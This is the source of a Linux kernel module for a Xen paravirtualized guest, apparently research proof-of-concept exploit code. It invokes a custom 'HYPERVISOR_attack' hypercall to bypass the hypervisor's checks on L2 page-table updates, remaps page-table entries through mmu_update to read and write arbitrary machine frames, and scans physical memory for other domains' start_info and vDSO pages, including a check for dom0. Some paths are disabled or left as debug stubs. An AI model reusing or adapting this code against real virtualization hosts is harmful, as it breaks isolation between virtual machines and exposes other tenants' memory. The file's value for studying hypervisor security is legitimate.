/* Linux Kernel Includes */
#include "linux/gfp.h"
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/delay.h>
#include <linux/slab.h>
#include <linux/sched.h>
#include <linux/gfp.h>
#include <linux/highmem.h>


/* Xen  Includes */
/* Xen header files */
#include <asm/xen/page.h>
#include <asm/xen/hypervisor.h>
#include <asm/xen/hypercall.h>
#include <xen/interface/event_channel.h>
#include <xen/xen.h>
#include <xen/interface/xen.h>
#include <xen/interface/memory.h>
#include <xen/interface/attack.h>
#include <asm/xen/interface.h>

#define MAX_MFN 0x7FFFFF
#define PMD_FLAG (_PAGE_RW | _PAGE_USER | _PAGE_ACCESSED | _PAGE_DIRTY | _PAGE_PRESENT)
#define PTE_FLAG PMD_FLAG
#define PADDR_BITS 44
#define PADDR_MASK ((1ULL << PADDR_BITS)-1)
#define pg_entry(__pgd, i) ((__pgd) + i)
#define pgd_to_mfn(__pgd) ((__pgd->pgd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pud_to_mfn(__pud) ((__pud->pud & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pmd_to_mfn(__pmd) ((__pmd->pmd & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define pte_to_mfn(__pte) ((__pte->pte & (PAGE_MASK & PADDR_MASK)) >> PAGE_SHIFT)
#define no_reserved_bits(x) ((x & (1<<7)) | ( (x>>43) & 127))

#define FIND_START_INFO_PAGE 1
#define FIND_VDSO_PAGE 2
#define DO_PAGE_READ 1
#define DO_PAGE_WRITE 2

#define DEBUG(_f, _a...) \
	printk("xen_test:%d - " _f "\n", __LINE__, ## _a);

#define __mfn(_v) ((unsigned long) (arbitrary_virt_to_machine(_v).maddr >> PAGE_SHIFT))
#define __machine_addr(_v) ((unsigned long) arbitrary_virt_to_machine(_v).maddr)

#define HYPERVISOR_tlb_flush_all() { \
	struct mmuext_op uops[] = {{.cmd =  MMUEXT_TLB_FLUSH_ALL}}; \
	HYPERVISOR_mmuext_op(uops, 1, NULL, DOMID_SELF); }

/*
 * Variables related to the attack
 */
#define SET_BYPASS_L2_UPDATE 1
#define UNSET_BYPASS_L2_UPDATE 2

static int clear = 0;
module_param(clear, int, 0);

static int addrs_ptr = 0;
static attack_t at_arg;

static void* l2_entry_va;


void print_xen_start_info_content(void){
	struct start_info *x = xen_start_info;
printk("\n\n\
  char magic[32]='%s'\t\t/* 'xen-<version>-<platform>'.            */\n\
  unsigned long nr_pages=%ld\t\t\t/* Total pages allocated to this domain.  */\n\
  unsigned long shared_info=%p\t/* MACHINE address of shared info struct. */\n\
  uint32_t flags=%X\t\t\t\t/* SIF_xxx flags.                         */\n\
  xen_pfn_t store_mfn=%ld\t\t/* MACHINE page number of shared page.    */\n\
  uint32_t store_evtchn=%d\t\t/* Event channel for store communication. */\n\
  union {\n\
    struct {\n\
            xen_pfn_t mfn=%ld\t/* MACHINE page number of console page.   */\n\
            uint32_t  evtchn=%d\t/* Event channel for console page.        */\n\
    } domU;\n\
    struct {\n\
            uint32_t info_off;  /* Offset of console_info struct.         */\n\
            uint32_t info_size; /* Size of console_info struct from start.*/\n\
    } dom0;\n", x->magic, x->nr_pages, (void *) x->shared_info, x->flags, x->store_mfn,
x->store_evtchn,x->console.domU.mfn, x->console.domU.evtchn);

printk("  } console;\n\
  /* THE FOLLOWING ARE ONLY FILLED IN ON INITIAL BOOT (NOT RESUME).     */\n\
  unsigned long pt_base=%p\t\t/* VIRTUAL address of page directory.     */\n\
  unsigned long nr_pt_frames=%ld\t\t\t/* Number of bootstrap p.t. frames.       */\n\
  unsigned long mfn_list=%p\t/* VIRTUAL address of page-frame list.    */\n\
  unsigned long mod_start=%p\t/* VIRTUAL address of pre-loaded module.  */\n\
  unsigned long mod_len=%ld\t/* Size (bytes) of pre-loaded module.     */\n\
  int8_t cmd_line[MAX_GUEST_CMDLINE]%s\n\
",(void *) x->pt_base,x->nr_pt_frames,(void *) x->mfn_list,(void *) x->mod_start, 
x->mod_len, x->cmd_line
);
}

void page_walk(unsigned long va, int fill_at)
{
	pgd_t *pgd;
	pud_t *pud;
	pmd_t *pmd;
	pte_t *pte;
	struct mm_struct *mm = current->mm;

	pgd = pgd_offset(mm, va);
	pud = pud_offset(pgd, va);
	pmd = pmd_offset(pud, va);
	pte = pte_offset_kernel(pmd, va);

    if (fill_at){
        at_arg.addrs[addrs_ptr++] = __machine_addr(va);
        at_arg.addrs[addrs_ptr++] = (unsigned long) __machine_addr(pgd);
        at_arg.addrs[addrs_ptr++] = (unsigned long)  __machine_addr(pud);
        at_arg.addrs[addrs_ptr++] = (unsigned long)  __machine_addr(pmd);
        at_arg.addrs[addrs_ptr++] = (unsigned long)  __machine_addr(pte);
    }

	printk("PGD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pgd, __machine_addr(pgd), *(unsigned long*) pgd, pgd_index(va), (pgd_present(*pgd)) ? "P" : "");
	printk("PUD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s)\n", pud, __machine_addr(pud), *(unsigned long*) pud, pud_index(va), (pud_present(*pud)) ? "P" : "");
	printk("PMD (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pmd, __machine_addr(pmd), *(unsigned long*) pmd, pmd_index(va), (pmd_present(*pmd)) ? "P" : "", (pmd_large(*pmd)) ? "PSE" : "");
	printk("PTE (%p - 0x%lx) val = 0x%lx, offset = 0x%lx \t(flags = %s %s)\n", pte, __machine_addr(pte), *(unsigned long*) pte, pte_index(va), (pte_present(*pte)) ? "P" : "", (pte_write(*pte)) ? "RW" : "");
}

pgd_t *get_pgd(unsigned long va)
{
	struct mm_struct *mm = current->mm;
	return pgd_offset(mm, va);
}

pud_t *get_pud(unsigned long va)
{
	return pud_offset(get_pgd(va), va);
}

pmd_t *get_pmd(unsigned long va)
{
	return pmd_offset(get_pud(va), va);
}

pte_t *get_pte(unsigned long va)
{
	return pte_offset_kernel(get_pmd(va), va);
}

/*
 * Check
 * http://xenbits.xen.org/docs/4.13-testing/hypercall/x86_64/include,public,xen.h.html#Func_HYPERVISOR_mmu_update
 *
 */
int mmu_update(unsigned long ptr, unsigned long val)
{
	struct mmu_update mmu_updates;
	int rc;

	mmu_updates.ptr = ptr;
	mmu_updates.val = val;
	rc = HYPERVISOR_mmu_update(&mmu_updates, 1, NULL, DOMID_SELF);
	HYPERVISOR_tlb_flush_all();

	return rc;
}

int startup_dump(unsigned long l2_entry_va, unsigned long aligned_mfn_va)
{
	pte_t *pte_aligned = get_pte(aligned_mfn_va);
	pmd_t *pmd = get_pmd(l2_entry_va);
	int rc;
    DEBUG("pte_aligned = 0x%lx", (unsigned long) pte_aligned);
    DEBUG("pte_aligned = 0x%lx", __machine_addr(pte_aligned));
    DEBUG("pte_aligned = 0x%lx", pte_aligned->pte);
    DEBUG("pte_aligned ~_PAGE_RW = 0x%lx", pte_aligned->pte & ~_PAGE_RW);
    DEBUG("\n");
    DEBUG("pmd_l2 0x%lx", pmd->pmd);
    DEBUG("pmd_l2 maddr  0x%lx", __machine_addr(pmd));
    DEBUG("pmd_l2 __mfn  0x%lx", __mfn(pmd));
    DEBUG("__mfn((void*) aligned_mfn_va) 0x%lx",__mfn((void*) aligned_mfn_va));
    DEBUG("__mfn((void*) aligned_mfn_va) << PAGE_SHIFT 0x%lx",
            __mfn((void*) aligned_mfn_va) << PAGE_SHIFT);
    DEBUG("__mfn((void*) aligned_mfn_va) << PAGE_SHIFT| PMD_FLAG  0x%lx",
            (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT)| PMD_FLAG );

    //return 0;
	// removes RW bit on the aligned_mfn_va's pte
    rc = mmu_update(__machine_addr(pte_aligned) | MMU_NORMAL_PT_UPDATE, 
            pte_aligned->pte & ~_PAGE_RW);
	if(rc < 0)
	{
		printk("cannot unset RW flag on PTE (0x%lx)\n", aligned_mfn_va);
		return -1;
	}

	// map.
    // points l2|pmd do l2_entry_va to pte of the aligned mfn_va
    rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, 
            (__mfn((void*) aligned_mfn_va) << PAGE_SHIFT) | PMD_FLAG);
	if(rc < 0)
	{
		printk("cannot update L2 entry 0x%lx\n", l2_entry_va);
		return -1;
	}

	return 0;
}

int set_l2_pse_flag(unsigned long va)
{
	pmd_t *pmd = get_pmd(va);
	int rc;

	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, pmd->pmd | _PAGE_PSE);
	if(rc < 0)
	{
		printk("cannot set PSE flag on PMD (0x%lx)\n", va);
		return -1;
	}

	return 0;
}

int unset_l2_pse_flag(unsigned long va)
{
	pmd_t *pmd = get_pmd(va);
	int rc;

	rc = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, pmd->pmd & ~_PAGE_PSE);
	if(rc < 0)
	{
		printk("cannot unset PSE flag on PMD (0x%lx)\n", va);
		return -1;
	}

	return 0;
}

void bypass_l2_update(int set, unsigned long va, int debug){

    long ret;
    pmd_t *pmd = get_pmd((unsigned long)l2_entry_va);

    if ( debug )
        at_arg.debug = 20;
    at_arg.addr = pmd->pmd;

    ret = HYPERVISOR_attack(set, (void*) &at_arg);

    if ( ret )
        DEBUG("Error on invoking the %d bypass update. Error:  %ld",set, ret);

	ret = mmu_update(__machine_addr(pmd) | MMU_NORMAL_PT_UPDATE, pmd->pmd & ~_PAGE_PSE);
	if(ret < 0)
		DEBUG("cannot unset PSE flag on PMD (0x%lx)\n", va);

}
int get_m2psdphys(struct xen_machphys_mapping *mp_map)
{
    int rc;
    rc = HYPERVISOR_memory_op(XENMEM_machphys_mapping, mp_map);
    if( rc ){
        printk("Error on obtaining the machphy_mapping %d", rc);
        return rc;
    }

    return 0;
}


int get_xmm(struct xen_memory_map *xmm)
{
    int rc;
    rc = HYPERVISOR_memory_op(XENMEM_memory_map, xmm);
    if( rc ){
        printk("Error on obtaining the memory map %d", rc);
        return rc;
    }

    return 0;

}

void test_mmu_update(void){
    DEBUG("Init!");
    bypass_l2_update(ATTACK_SET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
    DEBUG("l2_entry_va 0x%lx",(unsigned long)l2_entry_va);
    DEBUG("(unsigned long *) l2_entry_va 0x%lx",(unsigned long)(unsigned long*) l2_entry_va);
    print_xen_start_info_content();
    //DEBUG("*(unsigned long *) l2_entry_va 0x%lx",(unsigned long)*(unsigned long*) l2_entry_va);
    //*(unsigned long*) l2_entry_va = 1231231L;
    bypass_l2_update(ATTACK_UNSET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 0);
    DEBUG("END!");
}

void do_page_buff(unsigned long mfn, char *buff, int what)
{
    DEBUG("mfn\t%lx",mfn);
    DEBUG("l2 mfn\t%lx", (mfn << PAGE_SHIFT) | PTE_FLAG);
    DEBUG("l2_entry  ma\t%lx", __machine_addr(l2_entry_va));
    DEBUG("l2_entry  ma + pmd flags\t%lx", __machine_addr(l2_entry_va) | PMD_FLAG );
    DEBUG("l2_entry   \t%lx", (unsigned long)l2_entry_va);
    //DEBUG("*l2_entry  \t%lx",(unsigned long ) *((unsigned long*)l2_entry_va));
    DEBUG("l2_entry pmd  \t%lx", (unsigned long) get_pmd((unsigned long)l2_entry_va));
    DEBUG("l2_entry pmd->pmd  \t%lx", (unsigned long) get_pmd((unsigned long)l2_entry_va)->pmd);

	//set_l2_pse_flag((unsigned long) l2_entry_va);
    DEBUG("bypassing the l2 pointer");
    bypass_l2_update(ATTACK_SET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
    DEBUG("Attributing the l2 address to l2_entry_va");
//	*(unsigned long*) l2_entry_va = (mfn << PAGE_SHIFT) | PTE_FLAG;
	*(unsigned long*) l2_entry_va = 1231231L;
    DEBUG("disabling the bypass");
    bypass_l2_update(ATTACK_UNSET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
	//unset_l2_pse_flag((unsigned long) l2_entry_va);
    return;

	if(what == DO_PAGE_READ)
	{
        DEBUG("Read Page");
		memcpy(buff, l2_entry_va, PAGE_SIZE);
	}
	else if (what == DO_PAGE_WRITE)
	{
		memcpy(l2_entry_va, buff, PAGE_SIZE);
	}

    DEBUG("Reset process");
	//set_l2_pse_flag((unsigned long) l2_entry_va);
    bypass_l2_update(ATTACK_SET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
	*(unsigned long*) l2_entry_va = 0;
    bypass_l2_update(ATTACK_UNSET_BYPASS_L2_UPDATE, (unsigned long) l2_entry_va, 1);
	//unset_l2_pse_flag((unsigned long) l2_entry_va);
    DEBUG("Exit page_buff");
}

void dump_page_buff(unsigned long mfn, char *buff)
{
	do_page_buff(mfn, buff, DO_PAGE_READ);
}

void write_page_buff(unsigned long mfn, char *buff)
{
	do_page_buff(mfn, buff, DO_PAGE_WRITE);
}

void *memmem(const void *l, size_t l_len, const void *s, size_t s_len)
{
	register char *cur, *last;
	const char *cl = (const char *)l;
	const char *cs = (const char *)s;

	/* we need something to compare */
	if (l_len == 0 || s_len == 0)
		return NULL;

	/* "s" must be smaller or equal to "l" */
	if (l_len < s_len)
		return NULL;

	/* special case where s_len == 1 */
	if (s_len == 1)
		return memchr(l, (int)*cs, l_len);

	/* the last position where its possible to find "s" in "l" */
	last = (char *)cl + l_len - s_len;

	for (cur = (char *)cl; cur <= last; cur++)
		if (cur[0] == cs[0] && memcmp(cur, cs, s_len) == 0)
			return cur;

	return NULL;
}


int is_startup_info_page(char *page_data)
{
	int ret = 0;
	char marker[] = "xen-3.0-x86";

	if(memcmp(page_data, marker, sizeof(marker)-1) == 0)
	{
		ret = 1;
	}

	return ret;
}
/*
 * https://man7.org/linux/man-pages/man7/vdso.7.html
 */
int is_vdso_page(char *page_data)
{
	char elf_header[] = "\x7f\x45\x4c\x46\x02\x01\x01\x00";
	char vdso_marker[] = "vdso_gettimeofday";
	int ret = 0;

	if(!memcmp(page_data, elf_header, sizeof(elf_header)) &&
		memmem(page_data, PAGE_SIZE, vdso_marker, sizeof(vdso_marker)) != NULL)
	{
		ret = 1;
	}

	return ret;
}



int find_in_pte(pte_t *pte_base, int what)
{
	int i;
	pte_t *curr_pte;
	unsigned long curr_pte_val;
	unsigned int data_mfn;
	char *data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pte = pg_entry(pte_base, i);
		curr_pte_val = curr_pte->pte;
		data_mfn = pte_to_mfn(curr_pte);

		if((curr_pte_val & _PAGE_PRESENT) &&
		   (curr_pte_val & _PAGE_ACCESSED) &&
		   !(curr_pte_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pte_val) &&
		   data_mfn != 0 &&
		   data_mfn <= MAX_MFN)
		{
			dump_page_buff(data_mfn, data);

			if(what == FIND_START_INFO_PAGE && is_startup_info_page(data))
			{
				ret = data_mfn;
				break;
			}

			if(what == FIND_VDSO_PAGE && is_vdso_page(data))
			{
				ret = data_mfn;
				break;
			}

		}
	}

	kfree(data);
	return ret;
}

int find_in_pmd(pmd_t *pmd_base, int what)
{
	int i;
	pmd_t *curr_pmd;
	unsigned long curr_pmd_val;
	unsigned int pte_mfn;
	char *pte_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pmd = pg_entry(pmd_base, i);
		curr_pmd_val = curr_pmd->pmd;
		pte_mfn = pmd_to_mfn(curr_pmd);

		if((curr_pmd_val & _PAGE_PRESENT) &&
		   (curr_pmd_val & _PAGE_ACCESSED) &&
		   !(curr_pmd_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pmd_val) &&
		   pte_mfn != 0 &&
		   pte_mfn <= MAX_MFN)
		{
			dump_page_buff(pte_mfn, pte_data);
			ret = find_in_pte((pte_t*) pte_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pte_data);
	return ret;
}

int find_in_pud(pud_t *pud_base, int what)
{
	int i;
	pud_t *curr_pud;
	unsigned long curr_pud_val;
	unsigned int pmd_mfn;
	char *pmd_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pud = pg_entry(pud_base, i);
		curr_pud_val = curr_pud->pud;
		pmd_mfn = pud_to_mfn(curr_pud);

		if((curr_pud_val & _PAGE_PRESENT) &&
		   (curr_pud_val & _PAGE_ACCESSED) &&
		   !(curr_pud_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pud_val) &&
		   pmd_mfn != 0 &&
		   pmd_mfn <= MAX_MFN)
		{
			// printk("pud : %d, %lx, %lx, %lx\n", i, curr_pud->pud, curr_pud_val, pmd_mfn);
			dump_page_buff(pmd_mfn, pmd_data);
			ret = find_in_pmd((pmd_t*) pmd_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pmd_data);
	return ret;
}

int find_in_pgd(pgd_t *pgd_base, int what)
{
	int i;
	pgd_t *curr_pgd;
	unsigned long curr_pgd_val;
	unsigned int pud_mfn;
	char *pud_data = kmalloc(PAGE_SIZE, GFP_KERNEL);
	int ret = 0;

	for(i=0; i<512; i++)
	{
		curr_pgd = pg_entry(pgd_base, i);
		curr_pgd_val = curr_pgd->pgd;
		pud_mfn = pgd_to_mfn(curr_pgd);

		if((curr_pgd_val & _PAGE_PRESENT) &&
		   (curr_pgd_val & _PAGE_ACCESSED) &&
		   !(curr_pgd_val & _PAGE_PSE) &&
		   !no_reserved_bits(curr_pgd_val) &&
		   pud_mfn != 0 &&
		   pud_mfn <= MAX_MFN)
		{
			// printk("pgd : %d, %lx, %lx, %lx\n", i, curr_pgd->pgd, curr_pgd_val, pud_mfn);
			dump_page_buff(pud_mfn, pud_data);
			ret = find_in_pud((pud_t*) pud_data, what);
			if(ret != 0)
			{
				break;
			}
		}
	}

	kfree(pud_data);
	return ret;
}

int find_start_info_into_L4(unsigned long pgd_mfn, pgd_t * pgd)
{
	return find_in_pgd(pgd, FIND_START_INFO_PAGE);
}

int find_vdso_into_L4(unsigned long pgd_mfn, pgd_t * pgd)
{
	return find_in_pgd(pgd, FIND_VDSO_PAGE);
}


struct shared_info dummy_shared_info;
struct shared_info *HYPERVISOR_shared_info = (void *)&dummy_shared_info;
static struct arch_shared_info *my_arch;

void map_shared_info(void){
    if (!xen_feature(XENFEAT_auto_translated_physmap)) {
        printk("XENFEAT_auto_translated_physmap not enabled\n");
        printk("shared_info\t%lx\n", xen_start_info->shared_info);
        printk("__va(shared_info)\t%lx\n", __va(xen_start_info->shared_info));
        set_fixmap(FIX_PARAVIRT_BOOTMAP, xen_start_info->shared_info);
        HYPERVISOR_shared_info = (struct shared_info *)fix_to_virt(FIX_PARAVIRT_BOOTMAP);
    } else{
        HYPERVISOR_shared_info = (struct shared_info *)__va(xen_start_info->shared_info);
    }

    if(HYPERVISOR_shared_info == &dummy_shared_info)
    {
        printk(KERN_ALERT "shared_info not mapped.\n");
    }
    else
    {
        my_arch = &HYPERVISOR_shared_info->arch;
        printk("shared_info address %p\n", &HYPERVISOR_shared_info);
        printk("arch_shared_infp address %p\n", &my_arch);
    }
}


void print_my_arch_info(void)
{
    xen_pfn_t *mfn_list = (xen_pfn_t *) get_zeroed_page(__GFP_ZERO);

    printk("max_pfn\t%ld\n",my_arch->max_pfn);
    xen_pfn_t pfmfll =  my_arch->pfn_to_mfn_frame_list_list << PAGE_SHIFT;
    set_fixmap(FIX_PARAVIRT_BOOTMAP, pfmfll);
    pfmfll = fix_to_virt(FIX_PARAVIRT_BOOTMAP);
    printk("pfn_to_mfn_frame_list_list\t%lx\n",pfmfll);
    /*
    struct page *pg = pfn_to_page(my_arch->pfn_to_mfn_frame_list_list);
    get_page(pg);
    xen_pfn_t *mfn_list = (xen_pfn_t*)kmap(pg);
    */
    memcpy((void*) mfn_list,(void*) pfmfll, PAGE_SIZE);
    printk("mfn_list[0]\t%lx\n",mfn_list[0]);


}





void print_kmemory_info(void * ret){
    printk("Address of ret \t\t\t%p\n", &ret);
    /* 
     * __va is used only for converting virtuall memory on kernel 
     * every address is always virtual, we need to stablish the physicall address
     * __pa will get the physiscal address of this SO 
     * BUT, we are on a virtualized system
     */
    printk("Address of __pa(ret) \t\t%p\n",(void *) __pa(&ret));
    printk("Address of virt_to_phys(ret) \t\t%p\n",(void*) virt_to_phys(&ret));
    printk("PAGE_OFFSET \t%lX\n", PAGE_OFFSET);
    printk("virt_addr_valid(ret) \t%d\n", virt_addr_valid(&ret));
    printk("Address of virt_to_page(ret) \t%p\n", virt_to_page(&ret));
    printk("\n\n");
}

void clear_function(void){

    long ret;
    attack_t at_arg = {1, 0};

    DEBUG("Cleaning the hypervisor state");

    ret = HYPERVISOR_attack(ATTACK_UNSET_BYPASS_L2_UPDATE, (void*) &at_arg);

    if ( ret )
        DEBUG("Error on invoking the %d bypass update. Error:  %ld",
                ATTACK_UNSET_BYPASS_L2_UPDATE, ret);
}

static unsigned long big_mem[100];
static int __init hc_xen_ver_init(void) {

	unsigned long ret = 0;
    printk("Loading the hc_xen_ver : %s\n",__FUNCTION__);
    print_xen_start_info_content();

    if (clear)
    {
        clear_function();
        return 0;
    }



//    printk("\n\n");
//	ret = HYPERVISOR_xen_version(0, 0);
//    printk("Xen version %ld.%ld\n", ret >> 16, ret & 0xffff);
//    printk("Xen Running on: xen_domain_type = \t%d\n", xen_domain_type);
//    printk("Is a DomU = %d\n", xen_domain());
//    printk("\n\n");
    // allocating 1GB of memory
    for(ret=0; ret<100; ret++)
        big_mem[ret] = get_zeroed_page(__GFP_ZERO);
    
    //print_kmemory_info(&ret);
    

//     /* Read the CR3 Register*/
//     u64 cr3;
//     asm volatile("mov %%cr3, %%rax\n"
//             "mov %%rax, %0\n"
//             :"=m"(cr3)
//             ::"%rax"
//             );
//     printk("CR3 Register Content = %p\n", (void *)cr3);
//     printk("\n\n");
// 
//     map_shared_info();
// 
//    struct arch_shared_info *arch =  &HYPERVISOR_shared_info->arch;
//    printk("max_pfn \t%lx\n", arch->max_pfn);
//    printk("p2m_cr3 \t%lx\n", arch->p2m_cr3);
//    printk("p2m_vaddr \t%lx\n", arch->p2m_vaddr);
//    printk("p2m_generation \t%lX\n", arch->p2m_generation);


    void*  aligned_mfn_va;
	char *buff = kmalloc(PAGE_SIZE, GFP_KERNEL);
	unsigned long *current_tab = (unsigned long*) buff;
	struct start_info *start_f = (struct start_info *) buff;
	unsigned long page;
    /*  
     *  task_struct get_current => current 
     *  This is a pointer to the current process (which called the process) 
     */
	unsigned long *my_pgd = (unsigned long*) (current->mm->pgd);
	int tmp;
    
	// get an aligned mfn
	aligned_mfn_va = (void*) __get_free_pages(__GFP_ZERO, 9);
	DEBUG("aligned_mfn_va = %p", aligned_mfn_va);
	DEBUG("aligned_mfn_va mfn = 0x%lx", __machine_addr(aligned_mfn_va));
    page_walk((unsigned long) aligned_mfn_va, 0);

	// get a 2Mb virtual memory
	l2_entry_va = (void*) __get_free_pages(__GFP_ZERO, 9);
	DEBUG("l2_entry_va = %p", l2_entry_va);
	DEBUG("l2_entry_va mfn = 0x%lx", __machine_addr(l2_entry_va));
	page_walk((unsigned long) l2_entry_va, 0);


	if(startup_dump((unsigned long) l2_entry_va, (unsigned long) aligned_mfn_va))
	{
		DEBUG("unable to map PMD.");
		return -1;
	}
    //bypass_l2_update(ATTACK_SET_BYPASS_L2_UPDATE, 0x7FFFFA, 1);
    //bypass_l2_update(ATTACK_UNSET_BYPASS_L2_UPDATE, 0x7FFFFA, 1);

	DEBUG("startup_dump ok\n\n");
	DEBUG("l2_entry_va = %p", l2_entry_va);
	DEBUG("l2_entry_va mfn = 0x%lx", __machine_addr(l2_entry_va));
	page_walk((unsigned long) l2_entry_va, 1);

	DEBUG("aligned_mfn_va = %p", aligned_mfn_va);
	DEBUG("aligned_mfn_va mfn = 0x%lx", __machine_addr(aligned_mfn_va));
    page_walk((unsigned long) aligned_mfn_va, 1);


    struct xen_machphys_mapping mp_map;
    int rc;
    rc = get_m2psdphys(&mp_map);
    if (!rc) {
        DEBUG("Machine to pseudo physical mapping");
        DEBUG("max_mfn:%lx", mp_map.max_mfn);
        DEBUG("v_start:%lx", mp_map.v_start);
        DEBUG("v_end:%lx", mp_map.v_end);
    }

    struct xen_memory_map xmm;

    rc = get_xmm(&xmm);
    if (!rc) {
        DEBUG("Xem Memory Map");
        DEBUG("nr_entries:%x", xmm.nr_entries);
        DEBUG("buffer:%lx", (unsigned long) xmm.buffer);
    }

    map_shared_info();
    print_my_arch_info();



    //test_mmu_update();
    return 0;
    // mdelay(100);

    //printk("\n\n");
	//print_xen_start_info_content();

	for(page=0; page<1; page++)
	//for(page=0; page<MAX_MFN; page++)
	{
        DEBUG("page %li: %p",page,buff);  
		dump_page_buff(page, buff);
        continue;
		if(current_tab[261] == my_pgd[261] &&
		   current_tab[262] == my_pgd[262] &&
		   current_tab[511] != 0 &&
		   current_tab[510] != 0 &&
		   __mfn(my_pgd) != page)
		{
			tmp = find_start_info_into_L4(page, (pgd_t*) buff);
			if(tmp != 0)
			{
				// we find a valid start_info page
				DEBUG("start_info page : 0x%x", tmp);
				dump_page_buff(tmp, buff);

				if(start_f->flags & SIF_INITDOMAIN)
				{
					DEBUG("dom0!");
				} else {
					DEBUG("not dom0");
				}
			}
		}
	}

	return 0;
}


static void __exit hc_xen_ver_exit(void) {
    DEBUG("dealocating the memory");
    // allocating 1GB of memory
    int ret;
    for(ret=0; ret<100; ret++)
        free_page(big_mem[ret]);

    //DEBUG("dealocating the l2_entry_va %p",l2_entry_va);
    //free_page((unsigned long) l2_entry_va);

    printk(KERN_INFO "Exiting hc_xen_ver  module\n");

}

module_init(hc_xen_ver_init);
module_exit(hc_xen_ver_exit);


MODULE_LICENSE("GPL");
MODULE_AUTHOR("Charles F.'. Goncalves");

